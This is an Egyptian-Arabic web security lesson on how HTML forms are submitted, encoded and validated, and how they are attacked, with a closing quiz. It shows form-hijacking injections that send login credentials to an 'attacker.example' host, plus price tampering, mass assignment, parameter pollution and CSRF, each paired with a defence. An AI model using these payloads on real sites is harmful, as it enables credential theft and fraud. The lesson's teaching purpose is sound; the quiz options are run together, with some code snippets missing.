الفورمز (2): الإرسال، الـ Encoding، والـ Validation… وإزاي بيتعدّوا

في الدرس ده هتعرف بالظبط بيحصل إيه من لحظة ما تدوس «Submit» لحد ما الـ request يطلع: الـ validation، الـ submit event، بناء البيانات، والـ encoding. وبعدها هنكسر كل ده: validation بيتشال في ثانية، form بتتخطف بزرار واحد، وJSON بيتبعت من فورم HTML عادية.

رحلة الـ submit

المستخدم داس على زرار submit (أو Enter في خانة). الزرار ده اسمه الـ submitter، ولو ليه name قيمته هتتبعت، ولو عليه formaction/formmethod… هيغيّر سلوك الفورم. Constraint validation: المتصفح بيتشيك required وpattern وtype… لو فيه خانة invalid: بيوقف، بيطلّع رسالة، والـ invalid event بيطلع. (إلا لو فيه novalidate أو formnovalidate.) الـ submit event بيطلع. JavaScript يقدر يوقف كل حاجة بـ preventDefault() — ده اللي الـ SPAs بتعمله عشان تبعت بالـ fetch بدل ما تغيّر الصفحة. بناء الـ entry list: كل عنصر ليه name ومش disabled — مع استبعاد الـ checkbox/radio غير المختار والأزرار اللي مش هي الـ submitter. الـ encoding حسب الـ enctype: urlencoded (الافتراضي)، أو multipart، أو text/plain. الـ HTTP request بيتبني: GET = في الـ URL، POST = في الـ body، والـ cookies بتاعة الموقع المستهدف بتتلزق تلقائيًا (حسب SameSite). هنا Burp بيقف — وأي حاجة فاتت من المراحل اللي قبل (validation، hidden، disabled) ملهاش أي قيمة. المتصفح بيعمل navigation: الـ response بيستبدل الصفحة (أو بيفتح في الـ target).

GET ولا POST؟

GET

البيانات في الـ URL: /search?q=shoes. بتتحفظ في الـ history والـ bookmarks وlogs السيرفر والـ proxies، وممكن تتسرّب في الـ Referer. مناسبة للبحث والفلترة (عمليات قراية). عمرها ما تبقى لـ passwords أو tokens.

POST

البيانات في الـ body. مبتتحفظش في الـ URL، ومناسبة لأي حاجة بتغيّر state (login، شراء، حذف). بس متفتكرش إنها «مخفية»: أي proxy أو DevTools بيشوفها، والـ HTTPS هو اللي بيحميها في الطريق.

⚠️
GET بيمسح الـ query بتاع الـ action

فورم method="get" وaction="/search?lang=ar": المتصفح بيستبدل الـ query كلها بالـ form data، فالـ lang=ar بتضيع. لو محتاجها، حطها input type="hidden". (في POST الـ query بتفضل في الـ URL والداتا في الـ body.)

autocomplete

Form hijacking بـ HTML injection من غير JavaScript

فلتر بيمنع كل الـ scripts والـ event handlers، بس بيسمح بـ button وattributes زي form وformaction؟ زرار «Continue reading» بقى بيبعت الـ username والـ password (اللي ملاهم مدير الـ passwords تلقائيًا!) لسيرفر المهاجم. نفس الفكرة: حقن <form action="https://attacker.example"> قبل فورم الـ login الحقيقية — الـ parser بيتجاهل <form> الجاية لأن فيه فورم مفتوحة (مينفعش forms متداخلة)، فخانات الـ login تنضم لفورم المهاجم. الدفاع: CSP form-action 'self'.

التلاعب بالـ parameters

💰

Parameter tampering

<input type="hidden" name="price" value="499"> في فورم checkout = اطلب المنتج بـ price=1. أي قيمة بيتحسب منها حاجة مهمة لازم تتجاب من السيرفر/الـ database، مش من الـ request.

🧩

Mass assignment

فورم «تعديل البروفايل» فيها name وbio بس. ضيف إنت &role=admin أو &is_verified=1 للـ request. frameworks كتير بتربط كل الـ parameters بالـ model أوتوماتيك لو المطوّر مش عامل allow-list.

🔁

Parameter pollution

نفس الاسم مرتين: to=me&to=attacker. لو الـ WAF بيبص على الأول والـ backend بياخد التاني (أو العكس) = bypass.

🎭

CSRF

أي فورم POST ممكن تتبني في صفحة على موقع تاني وتتبعت للموقع المستهدف — والمتصفح بيلزق cookies الضحية لو الـ SameSite بيسمح. الحماية: CSRF token سري في كل فورم + SameSite + التحقق من Origin. (Chrome بيعتبر الـ cookie اللي من غير SameSite = Lax، بس مش كل المتصفحات.)

فورم login بـ `method="get"`. إيه أكبر مشكلة؟ الصفحة هتبقى أبطأ الـ password مش هيتبعت الـ password هيبقى في الـ URL: الـ history، logs السيرفر والـ proxies، وممكن يتسرّب في الـ Referer مفيش مشكلة لو HTTPS الـ HTTPS بيشفّر الـ URL في الطريق، بس الـ URL بيتسجّل في أماكن كتير على الطرفين. Credentials = POST دايمًا. الـ GET بيحط الداتا في الـ URL، والـ URL بيتحفظ ويتسجّل في الـ history والـ logs ويتسرّب. الـ HTTPS مش بيحل ده. ``. الحقيقة؟ القيمة مش بتتبعت القيمة بتتبعت، والمستخدم يقدر يغيّرها بـ DevTools أو Burp — السيرفر لازم ميثقش فيها المتصفح بيشفّر القيمة زي disabled بالظبط readonly = بيتبعت بس مش قابل للتعديل من الـ UI. أي حاجة بتتبعت ممكن تتغير. readonly بيتبعت (عكس disabled). وأي قيمة بتطلع من المتصفح تقدر تتعدّل قبل ما توصل. `pattern="[0-9]{4}"` والمستخدم كتب `12345`. valid؟ لأ — الـ pattern لازم يطابق القيمة كلها، و5 أرقام مش 4 أيوه لأن فيه 4 أرقام جوه أيوه لأن كلها أرقام الـ pattern مبيشتغلش على text المتصفح بيعمل anchoring لوحده (`^(?:[0-9]{4})$`). بس افتكر: ده في المتصفح بس. الـ pattern بيتطابق على القيمة كاملة — زي `^…$`. `12345` 5 أرقام فمش valid. عايز ترفع ملف بفورم. لازم إيه؟ `method="get"` `enctype="text/plain"` `accept="*"` `method="post"` و`enctype="multipart/form-data"` من غير multipart، الـ urlencoded بيبعت اسم الملف بس من غير محتواه. الملفات محتاجة `multipart/form-data` (و POST). غير كده بيتبعت الاسم بس. في صفحة login، مهاجم قدر يحقن HTML (من غير scripts) بعد الفورم. أنهي حقنة تسرق الـ credentials لما الضحية تدوس عليها؟ `Continue` `` `` `` الـ `form` بيربط الزرار بفورم الـ login، والـ `formaction` بيغيّر الوجهة — فالخانات (اللي مليانة) تروح للمهاجم. الدفاع: CSP `form-action`. اللينك والصورة مش بيبعتوا خانات الفورم. الزرار بـ `form` + `formaction` بيبعت الفورم كلها لسيرفر المهاجم. إيه اللي بيمنع موقع `evil.example` إنه يعمل فورم بتبعت POST لـ `bank.example/transfer`؟ المتصفح بيمنع أي فورم لموقع تاني مفيش حاجة بتمنع الإرسال نفسه — الحماية من الـ CSRF لازم تيجي من الموقع: CSRF token، SameSite cookies، وتشيك على Origin الـ CORS بيمنعه الـ HTTPS الفورمز «cross-site» مسموحة من أول الويب. الـ CORS بيتحكم في قراية الـ responses من JS، مش في إرسال فورم. المتصفح بيبعت الفورم عادي (ويمكن بالـ cookies). الـ CORS مالوش علاقة بالفورمز العادية. الحماية في الموقع المستهدف. `
